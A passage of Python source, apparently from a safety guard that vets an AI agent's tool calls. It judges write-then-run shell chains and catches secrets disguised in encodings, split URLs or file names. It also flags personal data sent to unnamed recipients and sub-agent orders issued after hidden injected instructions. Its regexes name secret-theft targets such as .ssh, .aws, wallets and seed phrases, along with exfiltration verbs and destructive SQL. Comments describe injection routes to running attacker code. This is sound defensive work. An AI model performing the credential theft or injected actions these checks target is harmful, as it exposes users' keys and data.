                                   evidence=x.evidence, severity=sev, message=msg))
    return sorted(out, key=lambda x: -x.severity)[:3]


MAX_DISK_READ = 256 * 1024


def _disk_text(full: str, s: Session) -> str | None:
    """A project file as it is on disk right now (what will really run). Only inside the workspace, only regular
    files, at most 256 KB, never blocking (a FIFO or device is skipped)."""
    import stat
    if not s.cwd or not s.in_workspace(full):
        return None
    try:
        st = os.stat(full)
        if not stat.S_ISREG(st.st_mode) or st.st_size > MAX_DISK_READ:
            return None
        fd = os.open(full, os.O_RDONLY | getattr(os, "O_NONBLOCK", 0))
        with os.fdopen(fd, "rb") as fh:
            return fh.read(MAX_DISK_READ).decode("utf-8", "replace")
    except OSError:
        return None


def _shell_writes_and_runs(s: Session, state: dict, injected: bool) -> list[Finding]:
    """Write-then-run through the shell. Text written with `>`, heredocs, tee or sed -i is judged like Write-tool
    content; copies and applied patches are judged as writes of what they carry; downloads and clones are remembered;
    files the command runs are read from disk and judged now."""
    out: list[Finding] = []
    for tgt, body in state.get("writes", [])[:50]:
        out += _written_code_findings(tgt, {"content": body}, s, injected, state)
        out += _written_secret_findings(tgt, body, s, state)
    known = {**s.risky_written, **(state.get("risky_written") or {})}
    for src, dst in state.get("copies", [])[:50]:
        # `cp data/fixture.txt tests/conftest.py`: the destination now holds the source's code, so judge it as a write
        # of that code to the destination (review 4: the disk check ran before the cp, on the old conftest).
        sfull, dfull = _norm_path(src, s), _norm_path(dst, s)
        if os.path.isdir(dfull) or dst.endswith("/"):
            dfull = os.path.join(dfull, os.path.basename(sfull))
        state.setdefault("copied", {})[dfull] = sfull
        state.setdefault("agent_written", set()).add(dfull)
        if sfull in known:
            state.setdefault("risky_written", {})[dfull] = known[sfull]
        text = _disk_text(sfull, s)
        if text:
            out += _written_code_findings(dfull, {"content": text}, s, injected, state)
    for patch in state.get("patches", [])[:10]:
        pfull = _norm_path(patch, s)
        text = _disk_text(pfull, s)
        for target, added in _patch_files(text or ""):
            tfull = _norm_path(target, s)
            state.setdefault("agent_written", set()).add(tfull)
            out += _written_code_findings(tfull, {"content": added}, s, injected, state)
        if pfull in known:
            sev, cat, msg = known[pfull]
            out.append(Finding(rule="exec.risky_written", severity=sev, category=cat, evidence=os.path.basename(pfull),
                               message=f"Applies {os.path.basename(pfull)}, which the agent wrote and which {msg}"))
    for p, (sev, host) in (state.get("downloaded") or {}).items():
        full = os.path.normpath(paths.expand(p.rstrip("/"), s.cwd)) + ("/" if p.endswith("/") else "")
        state.setdefault("risky_written", {})[full] = (
            sev, "network", f"came from {host or 'the internet'}, so running it runs code nobody has read.")
    out += _run_targets_findings(s, state.get("runs", []), injected, state)
    return out


def _norm_path(p: str, s: Session) -> str:
    return os.path.normpath(paths.expand(p, s.cwd))


def _run_targets_findings(s: Session, runs: list, injected: bool, state: dict) -> list[Finding]:
    if not runs or not s.cwd:
        return []
    fresh = state.get("risky_written") or {}
    known = {**s.risky_written, **fresh}
    copied: dict[str, str] = state.get("copied") or {}
    written = s.agent_written | set(state.get("agent_written") or ())
    files: list[str] = []
    runner_of: dict[str, str] = {}
    remembered: list[str] = []

    def add(p: str, runner: str | None = None) -> None:
        full = os.path.normpath(paths.expand(p, s.cwd))
        if full not in files:
            files.append(full)
        if runner:
            runner_of[full] = runner

    for kind, t in runs[:20]:
        if kind == "file":
            add(t)
        elif kind.startswith("as:"):
            add(t, kind[3:])
        elif kind == "make":
            if t.endswith("/"):
                d = os.path.normpath(paths.expand(t, s.cwd))
                for nm in ("GNUmakefile", "makefile", "Makefile"):
                    add(os.path.join(d, nm))
                remembered += [k for k in known if os.path.dirname(k) == d and
                               re.match(r"(?:gnu)?makefile|.*\.mk$", os.path.basename(k), re.I)]
            else:
                add(t)
        elif kind == "pytest":
            for d in ("", "tests", "test"):
                add(os.path.join(s.cwd, d, "conftest.py"))
            remembered += [k for k in known if k.endswith(".py") and s.in_workspace(k) and
                           re.match(r"conftest\.py$|test_.*\.py$|.*_test\.py$", os.path.basename(k))]
        elif kind == "npm":
            add("package.json")
        elif kind == "pip":
            for nm in ("setup.py", "pyproject.toml", "hatch_build.py"):
                add(nm)
    for f in list(files):  # Makefiles pull in other files
        if os.path.basename(f).lower() in ("makefile", "gnumakefile"):
            text = _disk_text(f, s) or ""
            for m in re.finditer(r"^-?s?include\s{1,8}(.{1,400})$", text, re.M):
                for inc in m.group(1).split()[:10]:
                    if "$" not in inc:
                        add(os.path.join(os.path.dirname(f), inc))
    out: list[Finding] = []
    dirs = [k for k in known if k.endswith("/")]  # cloned or downloaded folders: anything run from inside them
    remembered += [d for f in files for d in dirs if f.startswith(d)]
    for k in dict.fromkeys(remembered + [f for f in files if f in known]):
        sev, cat, msg = known[k]
        label = os.path.basename(k.rstrip("/")) + ("/" if k.endswith("/") else "")
        out.append(Finding(rule="exec.risky_written", severity=sev, category=cat, evidence=label,
                           message=f"Runs {label}, which the agent " + ("fetched and which " if cat == "network" else
                                                                         "wrote and which ") + msg))
    for f in files[:12]:
        # What will really run: for a file copied in this same command, the copy's source.
        text = _disk_text(copied.get(f, f), s)
        if text:
            agent = f in known or f in written
            out += _written_code_findings(f, {"content": text}, s, injected, None, run="agent" if agent else "disk",
                                          runner=runner_of.get(f))
        if injected and f in runner_of and f in written and not s.taint.names_path(f, s.cwd):
            # After hidden instructions, feeding a file the agent itself wrote to an interpreter, unasked, is how
            # the attacker's code gets run: stop it even when the code itself looks harmless.
            out.append(Finding(rule="exec.injected_written", severity=HIGH, category="injection",
                               evidence=os.path.basename(f),
                               message=f"Runs {os.path.basename(f)}, a file the agent wrote after hidden instructions "
                                       "were found, which you never asked it to run."))
    return sorted(out, key=lambda x: -x.severity)[:4]


def _written_secret_findings(path: str, content: str, s: Session, state: dict | None) -> list[Finding]:
    """A secret written into a file in disguise (base64, hex, split) makes that file a secret: a later push or
    upload of it is caught. The write itself needs an OK."""
    if not content or not (s.secret_values or find_secrets(content[:MAX_ARGS_CHARS])):
        return []
    hit = None
    for enc, d in _decoded_tokens(content):
        if find_secrets(d) or any(_shares_secret(d, v) for v in s.secret_values):
            hit = enc
            break
    if hit is None:
        return []
    if state is not None:
        state.setdefault("tainted_files", set()).add(os.path.normpath(paths.expand(path, s.cwd)))
    return [Finding(rule="secrets.encoded_write", severity=MEDIUM + 5, category="secrets",
                    message=f"Writes a secret it read into {path.rsplit('/', 1)[-1]}, disguised as {hit}.")]


def _url_host(u: str) -> str:
    m = re.match(r"^[a-z][\w+.-]{0,20}://(?:[^@/\s]{0,256}@)?([^/:?#\s]{1,256})", u, re.I)
    return m.group(1).lower() if m else u


SQL_SHAPES = re.compile(r"(?:^|;)\s{0,40}(?:drop\s{1,10}(?:table|database|schema|index|view|collection)|truncate\b|"
                        r"delete\s{1,10}from|alter\s{1,10}table|update\s{1,10}[\w.\"`\[\]]{1,128}\s{1,10}set\b|"
                        r"insert\s{1,10}into|create\s{1,10}(?:table|database|user|role)|grant\s|replace\s{1,10}into)",
                        re.I | re.M)
SQL_KEY = re.compile(r"(?:^|_)(sql|query|statement|stmt)s?$")


def _effective_cap(cap: Capability, args: dict) -> Capability:
    """A tool named like a reader ("query", "run_report") can still write: judge SQL by what it says."""
    if cap not in (Capability.READ, Capability.FETCH, Capability.UNKNOWN) and \
            not (cap == Capability.EXEC and not _first(args, CMD_KEYS)):
        return cap
    for q in _keyed(args, SQL_KEY):
        m = SQL_SHAPES.search(q[:20_000])
        if m:
            word = m.group(0).strip(" ;\n").split()[0].lower()
            return Capability.DELETE if word in ("drop", "truncate", "delete") else Capability.WRITE
    return cap


_TARGET_VERB = {Capability.SEND: "Sends to", Capability.MONEY: "Pays", Capability.FETCH: "Visits",
                Capability.WRITE: "Writes", Capability.AGENT: "Hands a sub-agent"}


def _summary(d: Decision, findings: list[Finding], cap: Capability) -> str:
    if not findings:
        return f"Looks like a normal {cap.value} action."
    core = [x for x in findings if x.rule != "taint.injection_context"] or findings
    # On a tie, the role rule reads clearest ("the inbox assistant may not move money").
    top = max(core, key=lambda x: (x.severity, x.category == "permission"))
    lead = {Decision.BLOCK: "Blocked", Decision.ASK: "Needs your OK", Decision.ALLOW: "Allowed"}[d]
    return f"{lead}: {top.message}"


def _arith(expr: str) -> str | None:
    """Shell arithmetic with plain numbers only, e.g. 7700+77."""
    if not re.fullmatch(r"[\d\s+\-*/()]{1,60}", expr):
        return None
    try:
        import ast
        node = ast.parse(expr.replace("/", "//"), mode="eval")
        if any(not isinstance(n, (ast.Expression, ast.BinOp, ast.UnaryOp, ast.Constant, ast.operator, ast.unaryop))
               for n in ast.walk(node)):
            return None
        val = eval(compile(node, "<arith>", "eval"), {"__builtins__": {}}, {})  # noqa: S307 - numbers only, checked above
        return str(int(val)) if isinstance(val, int) and abs(val) < 10 ** 9 else None
    except Exception:
        return None


def _levenshtein(a: str, b: str, cap: int = 3) -> int:
    if abs(len(a) - len(b)) > cap:
        return cap + 1
    prev = list(range(len(b) + 1))
    for i, ca in enumerate(a, 1):
        cur = [i] + [0] * len(b)
        for j, cb in enumerate(b, 1):
            cur[j] = min(prev[j] + 1, cur[j - 1] + 1, prev[j - 1] + (ca != cb))
        if min(cur) > cap:
            return cap + 1
        prev = cur
    return prev[-1]


def _skeleton(v: str) -> str:
    import unicodedata
    return unicodedata.normalize("NFKC", v.translate(CONFUSABLE)).lower().replace("rn", "m").replace("0", "o").replace("1", "l")


def _lookalike(v: str, named: set[str]) -> str | None:
    """A user-named address or handle that `v` imitates: one or two letters off, a swapped top-level domain
    (corp.co for corp.com), a clipped name (lice@ for alice@) or look-alike letters from another alphabet."""
    v = v.lower()
    for n in sorted(named):
        n = n.lower()
        if v == n or len(n) < 4:
            continue
        if _skeleton(v) == _skeleton(n):
            return n
        if "@" in v and "@" in n:
            vl, vd = v.rsplit("@", 1)
            nl, nd = n.rsplit("@", 1)
            vname, nname = vd.split(".")[0], nd.split(".")[0]
            if vl == nl and vd != nd and (vname == nname or _levenshtein(vd, nd) <= 2):
                return n  # same person, look-alike domain
            if vd == nd and vl != nl and (_levenshtein(vl, nl) <= 2 or (len(vl) >= 2 and (vl in nl or nl in vl))):
                return n  # same domain, clipped or misspelled name
        elif "@" not in v and "@" not in n and len(v) >= 4 and _levenshtein(v, n, 2) <= (1 if len(n) < 8 else 2):
            return n
    return None


def _has_recipients(args: dict) -> bool:
    vals = _keyed(args, RECIPIENT_KEY)
    return bool(vals) and bool(indicators("\n".join(vals)[:20_000]).get("email"))


def _asked_for_persistence(s: Session, path: str, full: str) -> bool:
    """The user named this exact file, or (for git hooks) the hook by name."""
    if not s.task:
        return False
    if "/.git/hooks/" in "/" + full.lstrip("/") and HOOK_WORDS.search(s.task):
        hook = full.rsplit("/", 1)[-1].lower()
        return hook in s.task.lower() or "hook" in s.task.lower()
    return s.taint.names_path(path, s.cwd)


def _decoded_tokens(text: str) -> list[tuple[str, str]]:
    """(encoding, decoded text) for every base64 or hex run in `text` that decodes to readable text."""
    import base64
    import binascii
    out: list[tuple[str, str]] = []
    for n, m in enumerate(B64_TOKEN.finditer(text[:MAX_ARGS_CHARS])):
        if n >= 300:
            break
        t = m.group(0)
        if HEX_TOKEN.fullmatch(t):
            try:
                d = bytes.fromhex(t).decode("utf-8")
                if d.isprintable():
                    out.append(("hex", d))
            except (ValueError, UnicodeDecodeError):
                pass
            continue
        b32 = False
        for piece in re.split(r"[/_-]", t):
            if re.fullmatch(r"[A-Z2-7]{16,4096}=*", piece):
                try:  # base32: upper-case letters and 2-7 only (often one segment of a URL path)
                    d = base64.b32decode(piece + "=" * (-len(piece) % 8)).decode("utf-8")
                    if d and sum(ch.isprintable() for ch in d) / len(d) > 0.95:
                        out.append(("base32", d))
                        b32 = True
                except (binascii.Error, ValueError, UnicodeDecodeError):
                    pass
        if b32:
            continue
        if not re.search(r"[A-Z]", t) or not re.search(r"[a-z0-9]", t):
            continue  # a plain word or path, not base64
        for fn in (base64.b64decode, base64.urlsafe_b64decode):
            try:
                d = fn(t + "=" * (-len(t) % 4)).decode("utf-8")
            except (binascii.Error, ValueError, UnicodeDecodeError):
                continue
            if d and sum(ch.isprintable() for ch in d) / len(d) > 0.95:
                out.append(("base64", d))
                break
    return out


def _encoded_secret_findings(blob: str, cap: Capability, s: Session, state: dict | None) -> list[Finding]:
    """A secret hidden as base64 or hex (or, in a commit, pasted as a bare value) still counts as the secret."""
    hit = None
    for enc, d in _decoded_tokens(blob):
        if find_secrets(d) or any(_shares_secret(d, v) for v in s.secret_values):
            hit = enc
            break
    egress = cap != Capability.EXEC or bool(GIT_EGRESS.search(blob) or EGRESS_CMD.search(blob) or GIT_RECORD.search(blob))
    if hit is None and s.secret_values and egress and cap != Capability.WRITE and _has_gram(blob, _secret_grams(s)):
        # Compared as lower-case letters and digits after URL-decoding: wJalrXUt%2F... , wjalrxut-k7mdeng-...,
        # w.J.a.l.r and DNS labels are all the same secret.
        hit = "changed text (other letter case, URL encoding or split into pieces)"
    if hit is None and cap == Capability.EXEC and GIT_RECORD.search(blob):
        if any(v in blob for v in s.secret_values if len(v) >= 10):
            hit = "plain text"
    if hit is None and any(v[::-1] in blob for v in s.secret_values if len(v) >= 12):
        hit = "reversed text"
    if hit is None and s.secret_values and cap != Capability.WRITE:
        hit = _split_secret(blob, s)
    if hit is None and cap == Capability.EXEC and s.secret_values and state is not None:
        named = _secret_named_paths(blob, s)
        if named:
            # Files or folders named after the secret: a later `git add && git push` publishes it.
            state.setdefault("tainted_files", set()).update(named)
            return [Finding(rule="secrets.in_filenames", severity=MEDIUM + 5, category="secrets",
                            message="Puts a secret it read into file or folder names, where a push would publish it.")]
    if hit is None:
        return []
    if cap != Capability.EXEC or GIT_EGRESS.search(blob) or EGRESS_CMD.search(blob):
        return [Finding(rule="secrets.egress_encoded", severity=CRITICAL, category="exfiltration",
                        message=f"Sends a secret it read, disguised as {hit}.")]
    if GIT_RECORD.search(blob):
        if state is not None:
            state.setdefault("staged_secrets", list(s.staged_secrets)).append(f"a commit message holding a secret ({hit})")
        return [Finding(rule="secrets.commit_message", severity=MEDIUM + 5, category="secrets",
                        message=f"Puts a secret it read into a git commit or tag message ({hit}), where a push would publish it.")]
    return [Finding(rule="secrets.encoded", severity=MEDIUM + 5, category="secrets",
                    message=f"Handles a secret it read, disguised as {hit}.")]


RUN = 16


def _alnum(t: str) -> str:
    """The letters and digits of `t`, lower case, after undoing URL encoding: a secret compared this way survives
    lower/upper case, %2F, and separators put between its pieces (dashes, dots, DNS labels, query parameters)."""
    if "%" in t:
        from urllib.parse import unquote
        t = unquote(unquote(t))
    return re.sub(r"[^a-z0-9]", "", t.lower())


def _secret_grams(s: Session) -> set[str]:
    grams: set[str] = set()
    for v in list(s.secret_values)[:500]:
        a = _alnum(v)
        if len(a) >= RUN:
            grams.update(a[i:i + RUN] for i in range(len(a) - RUN + 1))
    return grams


def _has_gram(text: str, grams: set[str]) -> bool:
    a = _alnum(text)
    return any(a[i:i + RUN] in grams for i in range(max(0, len(a) - RUN + 1)))


def _split_secret(blob: str, s: Session) -> str | None:
    """A secret cut into pieces inside one action: chunks in several URLs to the same host, or with its
    punctuation swapped. Joined back per host (after the shared prefix), it is still the secret."""
    grams = _secret_grams(s)
    if not grams:
        return None
    urls = re.findall(r"https?://[^\s'\"<>`;|&)]{1,2048}", blob[:MAX_ARGS_CHARS])[:200]
    by_host: dict[str, list[str]] = {}
    for u in urls:
        by_host.setdefault(_url_host(u), []).append(u)
    for us in by_host.values():
        if len(us) > 1:
            pre = os.path.commonprefix(us)
            joined = "".join(u[len(pre):] for u in us)
        else:
            joined = us[0]
        if _has_gram(joined, grams):
            return "pieces in web addresses"
    return None


def _secret_named_paths(blob: str, s: Session) -> set[str]:
    grams = _secret_grams(s)
    if not grams or not re.search(r"\b(?:touch|mkdir|mv|cp|ln|install|tee)\b|>", blob):
        return set()
    out: set[str] = set()
    for tok in re.findall(r"[^\s'\";&|<>()]{16,1024}", blob[:20_000])[:2000]:
        if "/" in tok or "." in tok:
            if _has_gram(tok, grams):
                out.add(os.path.normpath(paths.expand(tok, s.cwd)))
    return out


def _shares_secret(text: str, secret: str, run: int = 16) -> bool:
    """`text` holds the secret, or a 16-character run of it (a hand-mangled copy still leaks most of the key)."""
    if len(secret) < 10:
        return False
    if secret in text:
        return True
    return len(secret) >= run and any(secret[i:i + run] in text for i in range(len(secret) - run + 1))


def _luhn(digits: str) -> bool:
    d = [int(c) for c in digits][::-1]
    return sum(x if i % 2 == 0 else (x * 2 - 9 if x * 2 > 9 else x * 2) for i, x in enumerate(d)) % 10 == 0


def _pii_findings(args: dict, blob: str, s: Session, injected: bool) -> list[Finding]:
    """Sensitive personal data to someone the user never named: the classic "reply with your SSN" scam, where the
    attacker is the sender, so "reply to the sender" alone would wave it through."""
    rec = _keyed(args, RECIPIENT_KEY)
    found = indicators("\n".join(rec)[:20_000])
    people = sorted(found.get("email", set()) | found.get("phone", set())) or \
        [h for r in rec for h in _handles(r)]
    strangers = [p for p in people if not s.taint.is_trusted_value(p) and not s.taint.is_trusted_value(p.lstrip("@#"))]
    if not strangers:
        return []
    body = "\n".join(x for x in _strings(args) if x not in rec)[:MAX_ARGS_CHARS]
    what = next((name for name, pat in PII if pat.search(body)), None)
    if what is None:
        for m in CARD.finditer(body):
            digits = re.sub(r"\D", "", m.group(0))
            if 13 <= len(digits) <= 19 and _luhn(digits):
                what = "a card number"
                break
    if what is None:
        return []
    return [Finding(rule="exfil.personal_data", severity=HIGH + 5 if injected else MEDIUM + 5, category="exfiltration",
                    message=f"Sends {what} to {strangers[0]}, who you never named.")]


AGENT_SINK = re.compile(r"\b(?:send\w{0,3}|sent|upload\w{0,3}|post(?:s|ed|ing)?\b(?!\s(?:a|the)\s(?:summary|review))|"
                        r"put (?:it|them|this|a copy) (?:on|to|in)|back(?:s|ed|ing)?[ -]?up|backup|copy (?:it|them) to|"
                        r"forward\w{0,3}|email\w{0,3}|share\w{0,3}|pay\w{0,3}|transfer\w{0,3}|wire\b|delete\w{0,3}|remove\w{0,3}|"
                        r"wipe\w{0,3}|push\w{0,3}|publish\w{0,3}|exfil\w{0,8}|sync\w{0,3} to)", re.I)
AGENT_SECRET = re.compile(r"\b(?:ssh|private|api|deploy|signing|gpg|access)[ -]?keys?\b|\bkeys?\b|credential\w{0,2}|"
                          r"\btokens?\b|passwords?|passphrase|secrets?\b|\.env\b|hosts\.yml|\bcli (?:host )?config|"
                          r"\bhost config|keychain|wallet|seed phrase|cookies?\b|\.ssh|\.aws|\.netrc|\.npmrc", re.I)
AGENT_REF = re.compile(r"\b(?:mentioned|described|listed|given|linked|specified|named|requested|asked for) (?:in|by) the\b|"
                       r"\bas (?:the|that) (?:\w{1,20} ){0,3}(?:says|asks|instructs)|\bfrom the (?:pr|issue|readme|page|email|"
                       r"message|doc\w{0,6}|comment|ticket)\b|\bthe (?:server|url|address|endpoint|host) (?:in|from)\b", re.I)


def _agent_paraphrase(blob: str, s: Session, injected: bool) -> list[Finding]:
    """A sub-agent told, in new words, to do the attacker's job: its orders aren't copied from what the agent read,
    so the copy check misses them. After hidden instructions, orders that send, upload, pay or delete need an OK,
    and orders that touch keys or credentials are blocked. Before, only orders that pair a send with keys or with
    "the server mentioned in the PR" ask."""
    text = blob[:20_000]
    sink, secret, ref = AGENT_SINK.search(text), AGENT_SECRET.search(text), AGENT_REF.search(text)
    tainted = [v for v, src in s.taint.tainted_values(text)] if s.taint.untrusted else []
    if injected and secret and (sink or ref or tainted):
        return [Finding(rule="taint.agent_paraphrase", severity=HIGH, category="injection", evidence=secret.group(0),
                        message="Starts a helper agent, after hidden instructions were found, with orders that touch "
                                "your keys or credentials.")]
    if injected and (sink or tainted):
        return [Finding(rule="taint.agent_paraphrase", severity=MEDIUM, category="injection",
                        evidence=(sink.group(0) if sink else tainted[0]),
                        message="Starts a helper agent, after hidden instructions were found, with orders to send, "
                                "upload, pay or delete something.")]
    if sink and (secret or ref):
        return [Finding(rule="taint.agent_paraphrase", severity=MEDIUM, category="injection",
                        evidence=(secret or ref).group(0),
                        message="Starts a helper agent with orders to " + ("move your keys or credentials somewhere."
                                                                           if secret else "send something to a place named "
                                                                           "in content it read, not by you."))]
    return []


READ_ONLY_CMD = re.compile(r"^\s{0,8}(?:cat|head|tail|less|more|wc|ls|rm|grep|rg|file|stat|diff|du|shasum|md5|"
                           r"git\s{1,4}(?:diff|status|rm|checkout|restore|log|show|add))\b")


def _runs_risky_written(cmd: str, s: Session) -> list[Finding]:
    """Running a file the agent itself wrote earlier: judge it by what that file does, at full strength."""
    if not s.risky_written:
        return []
    if READ_ONLY_CMD.match(cmd) and not re.search(r"[|;&`$<>]", cmd):
        return []  # `cat x.txt`, `rm x.txt`, `git diff x.txt`: looking at or cleaning up a file is not running it
    out: list[Finding] = []
    for tok in re.findall(r"[\w./~-]{1,512}", cmd[:20_000]):
        full = os.path.normpath(paths.expand(tok, s.cwd))
        hit = s.risky_written.get(full)
        if hit and hit[1] == "network":
            continue  # a download only counts when it is run (see _run_targets_findings), not when it is chmod'ed or read
        if hit:
            sev, cat, msg = hit
            out.append(Finding(rule="exec.risky_written", severity=sev, category=cat, evidence=tok,
                               message=f"Runs {tok}, which the agent wrote and which {msg}"))
            break
    return out
